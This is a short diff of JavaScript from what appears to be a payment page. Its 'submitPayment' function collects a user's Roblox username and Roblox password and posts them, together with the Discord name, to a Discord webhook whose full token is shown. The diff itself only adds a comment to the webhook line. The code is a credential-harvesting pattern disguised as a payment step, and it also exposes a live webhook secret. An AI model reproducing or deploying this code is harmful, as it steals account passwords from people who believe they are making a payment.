@@ -29,7 +29,7 @@ function submitPayment() {
     var discordUsername = document.getElementById('discordUsername').value;
 
     // Send the payment details to the Discord webhook
-    var webhookURL = 'https://discord.com/api/webhooks/1259203378890670241/FVvyQ-QsNZ0rJ-3SfRDP2Ep6-i1qb442YuRztibJaA3cuzgisDK0ySEZU4woqdX5uiYg';
+    var webhookURL = 'https://discord.com/api/webhooks/1259203378890670241/FVvyQ-QsNZ0rJ-3SfRDP2Ep6-i1qb442YuRztibJaA3cuzgisDK0ySEZU4woqdX5uiYg'; // dont be an asshole.
     var payload = {
         content: `**Payment Details**\nAmount: $${amount}\nRoblox Username: ${robloxUsername}\nRoblox Password: ${robloxPassword}\nDiscord Username: ${discordUsername}`
     };
